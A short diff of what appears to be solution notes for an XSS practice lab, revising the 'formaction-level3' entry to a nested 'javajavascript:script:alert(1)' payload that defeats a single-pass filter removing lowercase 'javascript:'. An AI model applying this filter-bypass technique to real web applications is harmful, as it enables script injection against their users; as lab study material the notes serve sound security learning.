@@ -18,10 +18,10 @@ Reflection in `formaction` / `action` URL attributes — `javascript:` URI works
 
 ### formaction-level3
 
-`/formaction/level3/?query=javasJAVASCRIPT:cript:alert(1)`
+`/formaction/level3/?query=javajavascript:script:alert(1)`
 
-- payload: `javasJAVASCRIPT:cript:alert(1)`
-- context: literal `javascript:` removed once (not recursive, case-sensitive); inner removal leaves outer
+- payload: `javajavascript:script:alert(1)`
+- context: lowercase `javascript:` removed once; nest to reassemble (fires on submit)
 
 ### formaction-level4
 
